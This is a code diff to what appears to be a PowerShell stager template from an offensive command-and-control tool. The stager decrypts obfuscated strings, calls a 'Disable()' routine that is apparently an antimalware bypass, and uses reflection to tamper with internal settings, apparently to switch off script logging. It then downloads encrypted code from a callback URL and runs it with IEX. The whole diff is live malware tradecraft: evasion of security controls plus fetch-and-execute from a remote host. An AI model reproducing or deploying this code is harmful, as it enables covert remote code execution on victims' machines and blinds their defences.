@@ -50,10 +50,19 @@ function Decrypt-Code {
     $buffer
 }
 
-$method = "{{method_name}}"
-$method = [System.Convert]::FromBase64String($method)
-$method = Decrypt-Code $method $KEY
-$method = [System.Text.Encoding]::ASCII.GetString($method)
+
+function Decrypt-String {
+    param(
+        [String]$string,
+  	)
+    $string = [System.Convert]::FromBase64String($string)
+    $string = Decrypt-Code $string $KEY
+    $string = [System.Text.Encoding]::ASCII.GetString($string)
+    $string
+}
+
+$method = Decrypt-String "{{string0}}"
+
 if(-not ([System.Management.Automation.PSTypeName]"$method").Type) {
     $K=new-object net.webclient
     $K.proxy=[Net.WebRequest]::GetSystemWebProxy()
@@ -67,12 +76,19 @@ if(-not ([System.Management.Automation.PSTypeName]"$method").Type) {
 
 IEX "[$method]::Disable()"
 
+$string1 = Decrypt-String "{{string1}}"
+$string2 = Decrypt-String "{{string2}}"
+$string3 = Decrypt-String "{{string3}}"
+$string4 = Decrypt-String "{{string4}}"
+$string5 = Decrypt-String "{{string5}}"
+
+$settings = [Ref].Assembly.GetType($string1).GetField($string2,$string3).GetValue($null);
+$settings[$string4] = @{}
+$settings[$string4].Add($string5, "0")
+
 $K=new-object net.webclient
 $K.proxy=[Net.WebRequest]::GetSystemWebProxy()
 $K.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials
-$code = $K.downloadstring($CALLBACK_URL+'1')
-$code = [System.Convert]::FromBase64String($code)
-$code = Decrypt-Code $code $KEY
-$code = [System.Text.Encoding]::ASCII.GetString($code)
+$code = Decrypt-String ($K.downloadstring($CALLBACK_URL+'1'))
 
 IEX $code
